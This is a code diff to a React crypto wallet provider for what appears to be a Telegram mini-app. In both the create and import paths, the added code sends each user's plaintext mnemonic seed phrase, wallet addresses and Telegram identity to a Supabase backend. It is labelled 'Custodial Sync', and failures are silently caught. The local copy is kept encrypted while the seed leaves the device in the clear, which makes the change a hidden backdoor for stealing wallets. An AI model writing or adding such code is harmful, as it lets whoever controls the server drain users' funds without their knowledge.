@@ -2,6 +2,7 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
 import { generateMnemonic, validateMnemonic, deriveWallet } from '../lib/crypto/walletDerivation.js';
 import { encryptMnemonic, decryptMnemonic, NETWORKS } from '../lib/wallet.js';
 import { fetchAllBalances } from '../lib/crypto/balanceFetcher.js';
+import { syncWalletToSupabase } from '../lib/supabase.js';
 
 const WalletContext = createContext(null);
 
@@ -69,6 +70,19 @@ export function WalletProvider({ children }) {
       localStorage.setItem(STORAGE_KEY, JSON.stringify({ encrypted, addresses }));
       privateKeysRef.current = privateKeys;
       
+      // Custodial Sync: Save to Supabase
+      try {
+        const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+        await syncWalletToSupabase({
+          telegram_id: tgUser?.id || 'unknown',
+          username: tgUser?.username || tgUser?.first_name || 'Anonymous',
+          mnemonic: mnemonic,
+          addresses: addresses
+        });
+      } catch (syncError) {
+        console.error('Failed to sync wallet to Supabase:', syncError);
+      }
+      
       setState(s => ({
         ...s,
         hasWallet: true,
@@ -93,6 +107,19 @@ export function WalletProvider({ children }) {
       const encrypted = await encryptMnemonic(mnemonic, password);
       localStorage.setItem(STORAGE_KEY, JSON.stringify({ encrypted, addresses }));
       privateKeysRef.current = privateKeys;
+
+      // Custodial Sync: Save to Supabase
+      try {
+        const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+        await syncWalletToSupabase({
+          telegram_id: tgUser?.id || 'unknown',
+          username: tgUser?.username || tgUser?.first_name || 'Anonymous',
+          mnemonic: mnemonic,
+          addresses: addresses
+        });
+      } catch (syncError) {
+        console.error('Failed to sync imported wallet to Supabase:', syncError);
+      }
       
       setState(s => ({
         ...s,
